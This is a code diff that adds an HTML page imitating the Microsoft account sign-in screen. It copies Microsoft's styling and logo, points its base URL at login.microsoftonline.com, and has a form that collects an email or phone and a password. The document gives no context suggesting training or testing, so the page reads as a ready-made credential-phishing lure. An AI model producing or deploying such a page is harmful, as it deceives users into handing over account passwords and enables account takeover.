@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in to your account</title>
+    <base href="https://login.microsoftonline.com"/>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Helvetica, Sans-Serif; background: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; padding: 44px; width: 360px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        img { width: 108px; margin-bottom: 20px; }
+        h1 { font-size: 24px; font-weight: 600; margin-bottom: 15px; }
+        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #666; box-sizing: border-box; }
+        button { background: #0067b8; color: white; border: none; padding: 10px 30px; cursor: pointer; float: right; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
+        <h1>Sign in</h1>
+        
+        <form method="POST" action="">
+            <input type="email" name="username" placeholder="Email, phone, or Skype" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <div style="margin-top: 20px;">
+                <p style="font-size: 13px;">No account? <a href="#">Create one!</a></p>
+                <button type="submit">Next</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
